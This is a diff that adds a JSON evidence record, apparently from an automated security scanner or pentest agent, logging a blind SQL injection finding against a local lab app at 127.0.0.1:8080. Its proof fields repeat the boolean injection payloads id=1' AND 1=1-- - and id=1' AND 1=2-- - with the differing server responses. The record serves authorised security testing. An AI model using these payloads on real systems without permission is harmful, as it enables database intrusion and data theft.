@@ -1,0 +1,24 @@
+{
+  "id": "ev_1784861882134_e05de1",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "Blind SQL Injection in /vulnerabilities/sqli_blind/ @ http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+  "data": {
+    "kind": "proof",
+    "observation": "When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.",
+    "proof": "When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.",
+    "path_or_url": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+    "location": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+    "title": "Blind SQL Injection in /vulnerabilities/sqli_blind/",
+    "stdout": "When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.",
+    "body_preview": "When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.",
+    "capture_via": "write",
+    "how_captured": "script: proof_blind_sqli.txt",
+    "script_path": "proof_blind_sqli.txt",
+    "path": "proof_blind_sqli.txt",
+    "script_preview": "When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.",
+    "source_tool_act": "write",
+    "act_summary": "file write proof_blind_sqli.txt"
+  },
+  "created_at": "2026-07-24T02:58:02.134Z"
+}
